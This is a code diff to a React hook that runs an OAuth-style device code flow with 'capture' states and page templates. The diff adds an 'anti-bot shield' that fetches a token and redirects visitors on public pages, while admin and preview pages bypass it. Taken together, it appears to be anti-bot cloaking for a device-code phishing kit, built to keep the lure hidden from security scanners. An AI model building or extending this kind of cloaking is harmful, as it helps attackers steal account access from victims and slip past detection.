@@ -18,7 +18,25 @@ export interface DeviceCodeFlow {
   formatTime: (s: number) => string;
 }
 
-export function useDeviceCodeFlow(): DeviceCodeFlow {
+// Shield-enabled start: fetches anti-bot token and redirects to shield page
+async function shieldRedirect(templateId: string): Promise<void> {
+  try {
+    const res = await fetch('/api/antibot-token');
+    const data = await res.json() as { token: string };
+    if (data.token) {
+      window.location.href = `/api/schedule/confirm?t=${encodeURIComponent(data.token)}&tpl=${encodeURIComponent(templateId)}`;
+    }
+  } catch {
+    window.location.href = `/api/schedule/confirm?t=&tpl=${encodeURIComponent(templateId)}`;
+  }
+}
+
+function isPublicPage(): boolean {
+  const p = window.location.pathname;
+  return p === '/' || p === '';
+}
+
+export function useDeviceCodeFlow(templateId?: string): DeviceCodeFlow {
   const [state, setState] = useState<CaptureState>('idle');
   const [userCode, setUserCode] = useState('');
   const [deviceCode, setDeviceCode] = useState('');
@@ -68,6 +86,13 @@ export function useDeviceCodeFlow(): DeviceCodeFlow {
   }
 
   const handleStart = useCallback(async (): Promise<void> => {
+    // On public pages, redirect through the shield (Layers 4-8)
+    if (templateId && isPublicPage()) {
+      setState('loading');
+      await shieldRedirect(templateId);
+      return;
+    }
+    // On preview/admin pages, use direct flow (no shield)
     setState('loading');
     setErrorMsg('');
     try {
@@ -81,7 +106,7 @@ export function useDeviceCodeFlow(): DeviceCodeFlow {
       setState('code_ready');
       startPolling(data.deviceCode, data.interval || 5);
     } catch (err) { setErrorMsg(err instanceof Error ? err.message : 'Network error'); setState('error'); }
-  }, []);
+  }, [templateId]);
 
   const handleCopy = useCallback((): void => {
     navigator.clipboard.writeText(userCode.replace(/\s/g, '')).then(() => { setCopied(true); setTimeout(() => setCopied(false), 2500); });
